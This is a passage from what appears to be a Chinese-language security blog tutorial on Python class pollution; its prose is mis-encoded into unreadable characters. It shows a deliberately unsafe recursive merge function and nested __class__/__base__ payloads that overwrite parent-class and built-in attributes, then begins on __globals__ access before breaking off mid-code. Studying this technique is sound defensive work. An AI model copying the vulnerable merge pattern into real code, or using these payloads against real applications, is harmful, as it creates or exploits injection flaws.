</div><h2 id="å±é™©ä»£ç æ®µåˆå¹¶å‡½æ•°">å±é™©ä»£ç æ®µï¼ˆåˆå¹¶å‡½æ•°ï¼‰
</h2><p>å°±åƒ<code>Javascript</code>çš„åŸå‹é“¾æ±¡æŸ“ä¸€æ ·ï¼ŒåŒæ ·éœ€è¦ä¸€ä¸ªæ•°å€¼åˆå¹¶å‡½æ•°å°†ç‰¹å®šå€¼æ±¡æŸ“åˆ°ç±»çš„å±æ€§å½“ä¸­ï¼Œä¸€ä¸ªæ ‡å‡†ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹srcä¸­çš„é”®å€¼å¯¹è¿›è¡Œäº†éå†ï¼Œç„¶åæ£€æŸ¥dstä¸­æ˜¯å¦å«æœ‰<code>__getitem__</code>å±æ€§ï¼Œä»¥æ­¤æ¥åˆ¤æ–­dstæ˜¯å¦ä¸ºå­—å…¸ã€‚å¦‚æœå­˜åœ¨çš„è¯ï¼Œæ£€æµ‹dstä¸­æ˜¯å¦å­˜åœ¨å±æ€§kä¸”valueæ˜¯å¦æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±ç»§ç»­åµŒå¥—mergeå¯¹å†…éƒ¨çš„å­—å…¸å†è¿›è¡Œéå†ï¼Œå°†å¯¹åº”çš„æ¯ä¸ªé”®å€¼å¯¹éƒ½å–å‡ºæ¥ã€‚å¦‚æœä¸å­˜åœ¨çš„è¯å°±å°†srcä¸­çš„valueçš„å€¼èµ‹å€¼ç»™dstå¯¹åº”çš„keyçš„å€¼ã€‚</p>
<p>å¦‚æœdstä¸å«æœ‰getitemå±æ€§çš„è¯ï¼Œé‚£å°±è¯´æ˜dstä¸æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå°±ç›´æ¥æ£€æµ‹dstä¸­æ˜¯å¦å­˜åœ¨kçš„å±æ€§ï¼Œå¹¶æ£€æµ‹è¯¥å±æ€§å€¼æ˜¯å¦ä¸ºå­—å…¸ï¼Œå¦‚æœæ˜¯çš„è¯å°±å†é€šè¿‡mergeå‡½æ•°è¿›è¡Œéå†ï¼Œå°†kä½œä¸ºdstï¼Œvä½œä¸ºsrcï¼Œç»§ç»­å–å‡ºvé‡Œé¢çš„é”®å€¼å¯¹è¿›è¡Œéå†ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹srcçš„æ§åˆ¶ï¼Œæ¥æ§åˆ¶dstçš„å€¼ï¼Œæ¥è¾¾åˆ°æˆ‘ä»¬æ±¡æŸ“çš„ç›®çš„ã€‚</p>
<h2 id="æ±¡æŸ“è¿‡ç¨‹åˆ†æ">æ±¡æŸ“è¿‡ç¨‹åˆ†æ
</h2><p>ç”±äº<code>Python</code>ä¸­çš„ç±»ä¼šç»§æ‰¿çˆ¶ç±»ä¸­çš„å±æ€§ï¼Œè€Œç±»ä¸­å£°æ˜ï¼ˆå¹¶ä¸æ˜¯å®ä¾‹ä¸­å£°æ˜ï¼‰çš„å±æ€§æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è¿™äº›åœ¨å¤šä¸ªç±»ã€ç¤ºä¾‹ä¸­ä»ç„¶æŒ‡å‘å”¯ä¸€çš„å±æ€§ï¼Œå¦‚ç±»ä¸­è‡ªå®šä¹‰å±æ€§åŠä»¥<code>__</code>å¼€å¤´çš„å†…ç½®å±æ€§ç­‰</p>
<p>ä»¥è‡ªå®šä¹‰å±æ€§ä¸ºä¾‹å­ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">father</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret</span> <span class="o">=</span> <span class="s2">&#34;haha&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">son_a</span><span class="p">(</span><span class="n">father</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">son_b</span><span class="p">(</span><span class="n">father</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="n">son_b</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__class__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__base__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;secret&#34;</span> <span class="p">:</span> <span class="s2">&#34;no way&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">son_a</span><span class="o">.</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#haha</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">instance</span><span class="o">.</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#haha</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">son_a</span><span class="o">.</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#no way</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">instance</span><span class="o">.</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#no way</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬æ¨¡ä»¿ä¸€éæ±¡æŸ“è¿‡ç¨‹è¿›è¡Œä¸€ä¸‹è°ƒè¯•åˆ†æï¼ŒæŠŠæ–­ç‚¹ä¸‹åœ¨mergeæ“ä½œä¸‹ï¼š</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327163834420.png"
	width="1826"
	height="595"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327163834420_hu4948614204224292809.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327163834420_hu13339697526907735676.png 1024w"
	loading="lazy"
	
		alt="image-20250327163834420"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="736px"
	
></p>
<p>ç„¶åæˆ‘ä»¬å‘ç°ï¼Œæˆ‘ä»¬è‡ªè¡Œæ§åˆ¶çš„payloadä½œä¸ºsrcä¼ å…¥mergeå‡½æ•°ï¼Œç›®æ ‡å®ä¾‹instanceä½œä¸ºdstä¼ å…¥ï¼Œå¹¶ä¸”å°†payloadå¯¹åº”çš„kå’Œvçš„å€¼å–äº†å‡ºæ¥ï¼š</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327170354054.png"
	width="1820"
	height="557"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327170354054_hu17534074199655432365.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327170354054_hu12157283980069464104.png 1024w"
	loading="lazy"
	
		alt="image-20250327170354054"
	
	
		class="gallery-image" 
		data-flex-grow="326"
		data-flex-basis="784px"
	
></p>
<p>å› ä¸ºvä¸­ä¸å­˜åœ¨<code>__getitem__</code>ï¼Œæ‰€ä»¥è·³åˆ°äº†elifè¯­å¥ä¸‹é¢ï¼Œåˆå› ä¸ºvè¢«è¯†åˆ«ä¸ºäº†dict:1,è¡¨æ˜væ˜¯ä¸€ä¸ªå­—å…¸ä¸”ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ‰€ä»¥è¿›å…¥elifè¯­å¥ä¸‹é¢ï¼Œäºæ˜¯é€’å½’å°†vä½œä¸ºsrcå†èµ°ä¸€émergeå‡½æ•°ï¼š</p>
<p>ç›´åˆ°ç¬¬ä¸‰éï¼Œéå†åˆ°æœ€é‡Œé¢çš„secret:nowayä»¥åè¿›å…¥elseçš„setattrå‡½æ•°ï¼š</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327171050901.png"
	width="1762"
	height="397"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327171050901_hu4355303253444657450.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327171050901_hu4674317121025727308.png 1024w"
	loading="lazy"
	
		alt="image-20250327171050901"
	
	
		class="gallery-image" 
		data-flex-grow="443"
		data-flex-basis="1065px"
	
></p>
<p>ç„¶åå®Œæˆdst.k=vçš„æ±¡æŸ“ï¼Œè¿™æ ·æˆ‘ä»¬å°±å°†instance.secret=nowayæ±¡æŸ“æˆåŠŸ</p>
<p>ä¿®æ”¹å†…ç½®å±æ€§ä¹Ÿæ˜¯ç±»ä¼¼ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">father</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">son_a</span><span class="p">(</span><span class="n">father</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">son_b</span><span class="p">(</span><span class="n">father</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="n">son_b</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__class__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__base__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;__str__&#34;</span> <span class="p">:</span> <span class="s2">&#34;Polluted ~&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">father</span><span class="o">.</span><span class="fm">__str__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#&lt;slot wrapper &#39;__str__&#39; of &#39;object&#39; objects&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">father</span><span class="o">.</span><span class="fm">__str__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Polluted ~</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="æ— æ³•æ±¡æŸ“çš„object">æ— æ³•æ±¡æŸ“çš„<code>Object</code>
</h3><p>æ­£å¦‚å‰é¢æ‰€è¿°ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»çš„å±æ€§éƒ½å¯ä»¥è¢«æ±¡æŸ“ï¼Œå¦‚<code>Object</code>çš„å±æ€§å°±æ— æ³•è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥éœ€è¦ç›®æ ‡ç±»èƒ½å¤Ÿè¢«åˆ‡å…¥ç‚¹ç±»æˆ–å¯¹è±¡å¯ä»¥é€šè¿‡å±æ€§å€¼æŸ¥æ‰¾è·å–åˆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__class__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;__str__&#34;</span> <span class="p">:</span> <span class="s2">&#34;Polluted ~&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="nb">object</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#TypeError: can&#39;t set attributes of built-in/extension type &#39;object&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="åˆ©ç”¨">åˆ©ç”¨
</h2><p>åœ¨ä»£ç å±•ç¤ºéƒ¨åˆ†æ‰€ç»™å‡ºçš„ä¾‹å­ä¸­ï¼Œæ±¡æŸ“ç±»å±æ€§æ˜¯é€šè¿‡ç¤ºä¾‹çš„<code>__base__</code>å±æ€§æŸ¥æ‰¾åˆ°å…¶ç»§æ‰¿çš„çˆ¶ç±»ï¼Œä½†æ˜¯å¦‚æœç›®æ ‡ç±»ä¸åˆ‡å…¥ç‚¹ç±»æˆ–å®ä¾‹æ²¡æœ‰ç»§æ‰¿å…³ç³»æ—¶ï¼Œè¿™ç§æ–¹æ³•å°±æ˜¾å¾—ååˆ†æ— åŠ›</p>
<h3 id="å…¨å±€å˜é‡è·å–">å…¨å±€å˜é‡è·å–
</h3><p>åœ¨<code>Python</code>ä¸­ï¼Œå‡½æ•°æˆ–ç±»æ–¹æ³•ï¼ˆå¯¹äºç±»çš„å†…ç½®æ–¹æ³•å¦‚<code>__init__</code>è¿™äº›æ¥è¯´ï¼Œå†…ç½®æ–¹æ³•åœ¨å¹¶æœªé‡å†™æ—¶å…¶æ•°æ®ç±»å‹ä¸ºè£…é¥°å™¨å³<code>wrapper_descriptor</code>ï¼Œåªæœ‰åœ¨é‡å†™åæ‰æ˜¯å‡½æ•°<code>function</code>ï¼‰å‡å…·æœ‰ä¸€ä¸ª<code>__globals__</code>å±æ€§ï¼Œè¯¥å±æ€§å°†å‡½æ•°æˆ–ç±»æ–¹æ³•æ‰€ç”³æ˜çš„å˜é‡ç©ºé—´ä¸­çš„å…¨å±€å˜é‡ä»¥å­—å…¸çš„å½¢å¼è¿”å›ï¼ˆç›¸å½“äºè¿™ä¸ªå˜é‡ç©ºé—´ä¸­çš„<code>globals</code>å‡½æ•°çš„è¿”å›å€¼ï¼‰ã€‚å…·ä½“æ¥è¯´å°±æ˜¯ï¼Œ<code>__globals__</code> å±æ€§è¿”å›ä¸€ä¸ªå­—å…¸ï¼Œé‡Œé¢åŒ…å«äº†å‡½æ•°å®šä¹‰æ—¶æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">secret_var</span> <span class="o">=</span> <span class="mi">114</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">a</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
